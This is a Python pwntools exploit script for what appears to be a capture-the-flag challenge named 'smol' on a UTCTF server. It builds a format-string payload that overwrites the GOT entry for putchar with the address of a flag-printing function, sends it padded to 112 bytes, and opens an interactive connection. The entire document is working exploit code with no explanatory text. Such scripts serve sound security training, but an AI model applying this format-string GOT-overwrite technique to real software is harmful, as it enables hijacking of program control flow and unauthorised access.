from pwn import *

local = False

host, port = 'pwn.utctf.live',5004

p = ELF('./smol')
r = process('./smol') if local else remote(host, port)

flag_instr = 0x401349


def send_data(data):
	r.recvuntil('?')
	log.info("sending big data")
	r.sendline(data)

def send_payload(data):
	r.recvuntil('data')
	log.info("sending malicous payload")
	r.sendline(data)



if __name__=='__main__':
	context.clear(arch = 'amd64')
	
	payl = fmtstr_payload(6,{p.got['putchar']: flag_instr})
	
	send_data(payl+b'a'*(112-len(payl))+payl)

	send_payload('')
	r.interactive()








